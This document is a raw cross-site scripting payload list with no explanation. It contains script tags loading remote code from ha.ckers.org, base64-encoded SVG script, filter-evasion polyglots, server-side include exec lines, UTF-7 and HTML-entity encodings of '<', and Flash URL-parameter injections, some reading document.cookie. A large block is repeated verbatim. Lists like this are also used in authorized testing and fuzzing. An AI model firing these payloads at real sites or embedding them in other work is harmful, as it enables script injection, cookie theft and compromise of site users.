<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);
<HTML xmlns:xss>
  <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
  <xss:xss>XSS</xss:xss>
</HTML>
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
</BODY></HTML>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
javascript:alert(1)//INJECTX
<svg/onload=alert(1)>//INJECTX
<img onload=alert(1)>//INJECTX
<img src=x onerror=prompt(1)>//INJECTX
<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
 onmouseover="document.cookie=true;">//INJECTX
alert(1)>//INJECTX
<h1>INJECTX</h1>
<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
<svg><script>/<@/>alert(1)</script>//INJECTX
<svg/onload=alert(/INJECTX/)>
<iframe/onload=alert(/INJECTX/)>
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
}alert(/INJECTX/);{//
<h1/onclick=alert(1)>a//INJECTX
<svg/onload=alert(/INJECTX/)>
<p/onclick=alert(/INJECTX/)>a
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
<video><source onerror="javascript:alert(1)">//INJECTX
<video onerror="javascript:alert(1)"><source>//INJECTX
<audio onerror="javascript:alert(1)"><source>//INJECTX
<input autofocus onfocus=alert(1)>//INJECTX
<select autofocus onfocus=alert(1)>//INJECTX
<textarea autofocus onfocus=alert(1)>//INJECTX
<keygen autofocus onfocus=alert(1)>//INJECTX
<button form=test onformchange=alert(1)>//INJECTX
<form><button formaction="javascript:alert(1)">//INJECTX
<svg onload=(alert)(1) >//INJECTX
<script>$=1,alert($)</script>//INJECTX
<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
<img/src='x'onerror=alert(1)>//INJECTX
<marguee/onstart=alert(1)>//INJECTX
<script>alert(1)//INJECTX
<script>alert(1)<!--INJECTX
<marquee loop=1 width=0 onfinish=alert(1)>//INJECTXjaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
#getURL,javascript:alert(1)",
#goto,javascript:alert(1)",	
?javascript:alert(1)",
?alert(1)",
?getURL(javascript:alert(1))",
?asfunction:getURL,javascript:alert(1)//",
?getURL,javascript:alert(1)",
?goto,javascript:alert(1)",		
?clickTAG=javascript:alert(1)",
?url=javascript:alert(1)",
?clickTAG=javascript:alert(1)&TargetAS=",
?TargetAS=javascript:alert(1)",
?skinName=asfunction:getURL,javascript:alert(1)//",
?baseurl=asfunction:getURL,javascript:alert(1)//",
?base=javascript:alert(0)",                
?onend=javascript:alert(1)//",
?userDefined=');function someFunction(a){}alert(1)//",        
?URI=javascript:alert(1)",
?callback=javascript:alert(1)",
?getURLValue=javascript:alert(1)",
?goto=javascript:alert(1)",
?pg=javascript:alert(1)",
?page=javascript:alert(1)"
?playerready=alert(document.cookie)
javascript:alert(1)//INJECTX
<svg/onload=alert(1)>//INJECTX
<img onload=alert(1)>//INJECTX
<img src=x onerror=prompt(1)>//INJECTX
<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
 onmouseover="document.cookie=true;">//INJECTX
alert(1)>//INJECTX
<h1>INJECTX</h1>
<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
<svg><script>/<@/>alert(1)</script>//INJECTX
<svg/onload=alert(/INJECTX/)>
<iframe/onload=alert(/INJECTX/)>
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
}alert(/INJECTX/);{//
<h1/onclick=alert(1)>a//INJECTX
<svg/onload=alert(/INJECTX/)>
<p/onclick=alert(/INJECTX/)>a
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
<video><source onerror="javascript:alert(1)">//INJECTX
<video onerror="javascript:alert(1)"><source>//INJECTX
<audio onerror="javascript:alert(1)"><source>//INJECTX
<input autofocus onfocus=alert(1)>//INJECTX
<select autofocus onfocus=alert(1)>//INJECTX
<textarea autofocus onfocus=alert(1)>//INJECTX
<keygen autofocus onfocus=alert(1)>//INJECTX
<button form=test onformchange=alert(1)>//INJECTX
<form><button formaction="javascript:alert(1)">//INJECTX
<svg onload=(alert)(1) >//INJECTX
<script>$=1,alert($)</script>//INJECTX
<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
<img/src='x'onerror=alert(1)>//INJECTX
<marguee/onstart=alert(1)>//INJECTX
<script>alert(1)//INJECTX
<script>alert(1)<!--INJECTX
<marquee loop=1 width=0 onfinish=alert(1)>//INJECTXjaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
#getURL,javascript:alert(1)",
#goto,javascript:alert(1)",	
?javascript:alert(1)",
?alert(1)",
?getURL(javascript:alert(1))",
?asfunction:getURL,javascript:alert(1)//",
?getURL,javascript:alert(1)",
?goto,javascript:alert(1)",		
?clickTAG=javascript:alert(1)",
?url=javascript:alert(1)",
?clickTAG=javascript:alert(1)&TargetAS=",
?TargetAS=javascript:alert(1)",
?skinName=asfunction:getURL,javascript:alert(1)//",
?baseurl=asfunction:getURL,javascript:alert(1)//",
?base=javascript:alert(0)",                
?onend=javascript:alert(1)//",
?userDefined=');function someFunction(a){}alert(1)//",        
?URI=javascript:alert(1)",
?callback=javascript:alert(1)",
?getURLValue=javascript:alert(1)",
?goto=javascript:alert(1)",
?pg=javascript:alert(1)",
?page=javascript:alert(1)"
?playerready=alert(document.cookie)
